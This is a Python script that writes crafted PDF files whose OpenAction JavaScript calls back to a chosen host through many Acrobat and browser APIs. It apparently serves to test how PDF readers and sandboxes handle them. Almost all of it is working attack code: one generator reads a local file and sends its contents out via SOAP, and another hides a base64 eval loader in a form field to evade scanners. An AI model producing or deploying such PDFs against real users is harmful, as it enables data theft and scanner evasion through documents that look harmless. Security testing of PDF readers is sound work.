import base64
import bz2
import os


def _js_callback_pdf(filename, host, js_code, label):
    """Helper to generate a minimal PDF with a single JavaScript callback."""
    with open(filename, "w") as file:
        file.write('''%PDF-1.4
1 0 obj
<<>>
%endobj
trailer
<<
/Root
  <</Pages <<>>
  /OpenAction
      <<
      /S/JavaScript
      /JS(''' + js_code + ''')
      >>
  >>
>>''')


# test33.1: this.submitForm() - Acrobat JS form submission
def create_malpdf33_1(filename, host):
    _js_callback_pdf(filename, host,
        'this.submitForm({cURL: "' + host + '/test33_1-submitform"})',
        'js-submitform')

# test33.2: this.getURL() - Acrobat JS URL fetch
def create_malpdf33_2(filename, host):
    _js_callback_pdf(filename, host,
        'this.getURL("' + host + '/test33_2-geturl")',
        'js-geturl')

# test33.3: app.launchURL() - Acrobat JS launch URL
def create_malpdf33_3(filename, host):
    _js_callback_pdf(filename, host,
        'app.launchURL("' + host + '/test33_3-launchurl")',
        'js-launchurl')

# test33.4: app.media.getURLData() - Acrobat JS media fetch
def create_malpdf33_4(filename, host):
    _js_callback_pdf(filename, host,
        'app.media.getURLData("' + host + '/test33_4-geturldata", "audio/mp3")',
        'js-geturldata')

# test33.5: SOAP.connect() - Acrobat JS SOAP connection
def create_malpdf33_5(filename, host):
    _js_callback_pdf(filename, host,
        'SOAP.connect("' + host + '/test33_5-soap-connect")',
        'js-soap-connect')

# test33.6: SOAP.request() - Acrobat JS SOAP request
def create_malpdf33_6(filename, host):
    _js_callback_pdf(filename, host,
        'SOAP.request({cURL:"' + host + '/test33_6-soap-request",oRequest:{},cAction:""})',
        'js-soap-request')

# test33.7: this.importDataObject() - Acrobat JS data import
def create_malpdf33_7(filename, host):
    _js_callback_pdf(filename, host,
        'this.importDataObject("file","' + host + '/test33_7-dataobject")',
        'js-dataobject')

# test33.8: app.openDoc() - Acrobat JS open document
def create_malpdf33_8(filename, host):
    _js_callback_pdf(filename, host,
        'app.openDoc("' + host + '/test33_8-opendoc")',
        'js-opendoc')

# test33.9: fetch() - Web API (PDF.js / browser context)
def create_malpdf33_9(filename, host):
    _js_callback_pdf(filename, host,
        'fetch("' + host + '/test33_9-fetch")',
        'js-fetch')

# test33.10: XMLHttpRequest - Web API (PDF.js / browser context)
def create_malpdf33_10(filename, host):
    _js_callback_pdf(filename, host,
        'var r=new XMLHttpRequest();r.open("GET","' + host + '/test33_10-xhr");r.send()',
        'js-xhr')

# test33.11: new Image() - Web API (PDF.js / browser context)
def create_malpdf33_11(filename, host):
    _js_callback_pdf(filename, host,
        'var img=new Image(1,1);img.src="' + host + '/test33_11-img"',
        'js-img')

# test33.12: WebSocket - Web API (PDF.js / browser context)
def create_malpdf33_12(filename, host):
    ws_host = host.replace('https://', 'wss://').replace('http://', 'ws://')
    _js_callback_pdf(filename, host,
        'new WebSocket("' + ws_host + '/test33_12-ws")',
        'js-ws')

# test33.13: RSS.addFeed() - Acrobat JS RSS feed callback
# Source: April 2026 Adobe Reader 0-day blog post (ExpMon)
# RSS.addFeed is a bidirectional C2 primitive in Acrobat's JS engine.
def create_malpdf33_13(filename, host):
    _js_callback_pdf(filename, host,
        'RSS.addFeed({cURL: "' + host + '/test33_13-rss-addfeed"})',
        'js-rss-addfeed')

# test33.14: util.readFileIntoStream() + SOAP.request() exfil chain
# Source: April 2026 Adobe Reader 0-day blog post (ExpMon)
# Reads a local file via util.readFileIntoStream and exfiltrates the content
# via SOAP.request. The try/catch ensures the error path also produces a
# callback when the read is blocked by the Acrobat sandbox, so the test still
# functions as an API surface probe.
def create_malpdf33_14(filename, host):
    _js_callback_pdf(filename, host,
        'try{var s=util.readFileIntoStream("/etc/hostname",0);'
        'SOAP.request({cURL:"' + host + '/test33_14-readfile",'
        'oRequest:{"x":util.stringFromStream(s)},cAction:""})}catch(e){'
        'SOAP.request({cURL:"' + host + '/test33_14-readfile-err",'
        'oRequest:{"e":e.toString()},cAction:""})}',
        'js-readfile')

# test33.15: Form-field-staged JS loader
# Source: April 2026 Adobe Reader 0-day blog post (ExpMon)
# The actual payload is base64-encoded inside an AcroForm /Tx widget /V value.
# OpenAction JS is just a loader stub that retrieves the field value via
# getField() and decodes/evals it. This defeats naive /JS regex scanners that
# only inspect the literal /JS (...) block. Inner payload is app.launchURL().
def create_malpdf33_15(filename, host):
    inner_js = 'app.launchURL("' + host + '/test33_15-staged")'
    payload_b64 = base64.b64encode(inner_js.encode('latin-1')).decode('ascii')
    with open(filename, "w") as file:
        file.write('''%PDF-1.7

1 0 obj
  << /Type /Catalog
     /Pages 2 0 R
     /AcroForm << /Fields [5 0 R] >>
     /OpenAction 6 0 R
  >>
endobj

2 0 obj
  << /Type /Pages
     /Kids [3 0 R]
     /Count 1
     /MediaBox [0 0 595 842]
  >>
endobj

3 0 obj
  << /Type /Page
     /Parent 2 0 R
     /Resources
      << /Font
          << /F1
              << /Type /Font
                 /Subtype /Type1
                 /BaseFont /Courier
              >>
          >>
      >>
     /Annots [5 0 R]
     /Contents [4 0 R]
  >>
endobj

4 0 obj
  << /Length 67 >>
stream
  BT
    /F1 22 Tf
    30 800 Td
    (Testcase: 'staged-loader') Tj
  ET
endstream
endobj

5 0 obj
  << /Type /Annot
     /Subtype /Widget
     /Rect [0 0 0 0]
     /FT /Tx
     /T (btn1)
     /V (''' + payload_b64 + ''')
     /F 2
  >>
endobj

6 0 obj
  << /Type /Action
     /S /JavaScript
     /JS (eval(util.stringFromStream(util.streamFromString(getField("btn1").value),"base64")))
  >>
endobj

xref
0 7
0000000000 65535 f
0000000010 00000 n
0000000115 00000 n
0000000196 00000 n
0000000400 00000 n
0000000510 00000 n
0000000640 00000 n
trailer
  << /Root 1 0 R
     /Size 7
  >>
startxref
800
%%EOF
''')
